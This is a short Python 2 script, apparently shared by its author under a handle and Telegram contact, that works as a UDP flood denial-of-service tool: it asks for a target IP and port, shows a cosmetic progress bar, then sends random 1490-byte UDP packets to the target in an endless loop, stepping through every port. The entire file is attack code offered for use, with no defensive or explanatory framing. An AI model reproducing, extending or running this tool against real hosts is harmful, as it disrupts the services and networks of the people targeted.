import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Mr ddos")
print "Name       :Mr Dark elkabos"
print "Telegram   :@Mr_Dark_elkabos"

ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Dark ddos")
print "Mr Dark elkabos"
print "[                    \x1b[1;31m] 0%"
time.sleep(5)
print "[....                 \x1b[1;31m] 25%"
time.sleep(5)
print "[............            \x1b[1;31m] 50%"
time.sleep(5)
print "[.....................       \x1b[1;31m] 75%"
time.sleep(5)
print "[................................ \x1b[1;31m] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1